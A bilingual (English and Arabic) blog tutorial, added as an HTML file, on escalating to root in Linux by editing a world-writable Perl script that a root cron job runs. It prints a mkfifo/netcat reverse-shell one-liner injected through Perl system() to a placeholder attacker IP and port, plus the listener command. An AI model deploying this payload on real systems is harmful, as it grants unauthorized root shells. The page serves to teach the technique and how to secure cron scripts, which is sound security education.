@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Privilege Escalation - Cron Jobs | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">linux-privesc</a><span class="sep">/</span><span>Privilege Escalation - Cron Jobs</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">linux-privesc</span>
+<span class="post-date">2023-03-10</span>
+</div>
+<h1 class="post-title">Privilege Escalation - Cron Jobs</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, I will explain one of the techniques for privilege escalation on Linux systems. This technique relies on exploiting Cron Jobs. If you do not have a background on Cron Jobs or how they work, I recommend reviewing a Cron Jobs overview before continuing with this article.</p>
+<h2>Explanation</h2>
+<h3>Initial Access as a Low-Privileged User</h3>
+<p>To begin, we are logged into the system as a low-privileged user called <code>test</code>. Our goal is to escalate our privileges so that we can execute commands as the <code>root</code> user, which holds the highest level of privilege on a Linux system.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/1.jpeg" alt="Step 1" loading="lazy"></figure>
+<h3>Examining the Crontab</h3>
+<p>Since this technique depends on Cron Jobs, the first thing we need to do is read the system's crontab file to see what scheduled tasks are configured. We do this with the following command:</p>
+<pre><code class="language-bash">cat /etc/crontab
+</code></pre>
+<p>After examining the output, we notice something very interesting: one of the scheduled tasks runs a Perl script every single minute, and it runs with root privileges. This is a potential goldmine for privilege escalation -- if we can modify that Perl script, we can inject our own code that will be executed as root.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/2.png" alt="Step 2" loading="lazy"></figure>
+<h3>Checking File Permissions</h3>
+<p>The next step is to navigate to the directory where the Perl script is located and check whether our low-privileged user has write permissions on the file. The script is located in:</p>
+<pre><code>/tmp/
+</code></pre>
+<p>After checking the file permissions, we confirm that our user has both read and write access to the Perl script. This is the critical piece of the puzzle -- we have a script that runs as root every minute via cron, and we can modify its contents.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/3.png" alt="Step 3" loading="lazy"></figure>
+<h3>Crafting the Reverse Shell Payload</h3>
+<p>Since we can write to the file and it executes as root, we can inject a command that establishes a reverse shell connection back to our attacker machine. This means the system will connect back to us and give us an interactive shell with root privileges.</p>
+<p>We write the following code inside the Perl script:</p>
+<pre><code class="language-perl">system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f&quot;)
+</code></pre>
+<p>Before writing this into the file, you need to make two modifications:
+- Replace <code>IP</code> with the IP address of your attacking machine (the machine where you want to receive the reverse shell connection)
+- Replace <code>PORT</code> with any port number of your choosing that you will listen on</p>
+<p>This command works as follows:
+1. <code>rm /tmp/f</code> -- removes any existing named pipe at <code>/tmp/f</code>
+2. <code>mkfifo /tmp/f</code> -- creates a named pipe (FIFO) at <code>/tmp/f</code>
+3. <code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc IP PORT &gt; /tmp/f</code> -- reads from the pipe, feeds it into an interactive shell, redirects both stdout and stderr to a netcat connection back to the attacker, and writes the output back to the pipe, creating a full bidirectional reverse shell</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/4.png" alt="Step 4" loading="lazy"></figure>
+<h3>Setting Up the Listener</h3>
+<p>Before saving the modified script, you need to set up a listener on your attacking machine to catch the incoming reverse shell connection. Use netcat with the following command:</p>
+<pre><code class="language-bash">nc -lvp PORT
+</code></pre>
+<p>Replace <code>PORT</code> with the same port number you specified in the reverse shell payload. The flags mean:
+- <code>-l</code> -- listen mode
+- <code>-v</code> -- verbose output
+- <code>-p</code> -- specify the port to listen on</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/5.png" alt="Step 5" loading="lazy"></figure>
+<h3>Waiting for Execution</h3>
+<p>Now we wait. Since the cron job executes every minute, it will not take long. After a short wait, the cron job fires, executes our modified Perl script as root, and the reverse shell payload runs. The target system connects back to our listener.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/6.png" alt="Step 6" loading="lazy"></figure>
+<h3>Result</h3>
+<p>Once the cron job executes, we receive a reverse shell connection on our netcat listener with root privileges. We have successfully escalated from the low-privileged <code>test</code> user to full root access on the system.</p>
+<h2>Summary</h2>
+<p>This privilege escalation technique exploits a misconfigured cron job. The vulnerability exists because a script that runs as root on a scheduled basis is writable by a low-privileged user. By injecting a reverse shell payload into the script, we were able to leverage the cron job's root execution context to obtain a root shell. This highlights the importance of properly securing any scripts or files referenced by cron jobs, especially those running with elevated privileges.</p>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/">https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/</a></li>
+</ul>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/7.png" alt="Step 7" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح اشرح لكم تكنيك من تكنيكات رفع الصلاحية على نظام اللينكس وفي هذا التكنيك راح نعتمد على Cron Jobs ف إذا ماعندك خلفية عنها او كيفية طريقة عملها تقدرتتابع هذي المقالة</p>
+<p>شرح Cron Jobs</p>
+<p>الشرح:</p>
+<p>ف البداية انا داخل بيوز محدود الصلاحية على النظام واسم اليوز test طبعا الهدف اللي ودنا نوصله انه نقدر ننفذ اوامر بيوزر root اللي هو اعلى صلاحية على النظام بالنسبة للينكس</p>
+<p>طبعا بما انه التكنيك هذا يعتمد على Cron Jobs راح نقرا الملف الخاص بالجدولة حقته عن طريق هذا الامر</p>
+<p>cat /etc/crontab</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/1.jpeg" alt="Step 1" loading="lazy"></figure>
+
+<p>نلاحظ عندنا في احد التاسكات او المهام اللي تتنفذ كل دقيقة انه يقوم بتشغيل ملف بلغة perl كل دقيقة بصلاحية root جميل ..</p>
+<p>خلونا نروح لمسار الملف عشان نشوف هل عندنا صلاحية للتعديل على الملف او لا:</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/2.png" alt="Step 2" loading="lazy"></figure>
+
+<p>tmp/</p>
+<p>نلاحظ انه عندنا صلاحية الكتابة و القراءة على الملف ف لو ننفذ امر على النظام عن طريق دالة system هذا الامر راح يرجع لنا اتصال عكسي وترجع لنا جلسة بصلاحية root</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/3.png" alt="Step 3" loading="lazy"></figure>
+
+<p>راح نكتب هذا الكود داخل الملف :</p>
+<p>system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f")</p>
+<p>طبعا انت راح تعدل في الامر قبل لا تكتبه في الملف</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/4.png" alt="Step 4" loading="lazy"></figure>
+
+<p>راح تحط محل كلمة IP الايبي الخاص بجهازك اللي راح تنفتح عليه الجلسة وكذلك راح تغير كلمة PORT وتحط اي بورت من عندك</p>
+<p>وقبل لا تسوي حفظ للملف راح تسوي تنصت عن طريق اداة النت كات على البورت اللي وضعته في الامر</p>
+<p>وهذ الامر الخاص بالتنصت :</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/5.png" alt="Step 5" loading="lazy"></figure>
+
+<p>nc -lvp PORT</p>
+<p>راح ننتظر بضع دقائق حتى توصلنا الجلسة :)</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/6.png" alt="Step 6" loading="lazy"></figure>
+
+<p>وبكذا حصلنا على اعلى صلاحية في النظام root</p>
+<p>المصادر:</p>
+<figure class="article-img"><img src="../assets/images/privilege-esclation-cronjob/7.png" alt="Step 7" loading="lazy"></figure>
+
+<p>https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/</p>
+<p>كلمات دليلية: hacking, linux, privilege</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
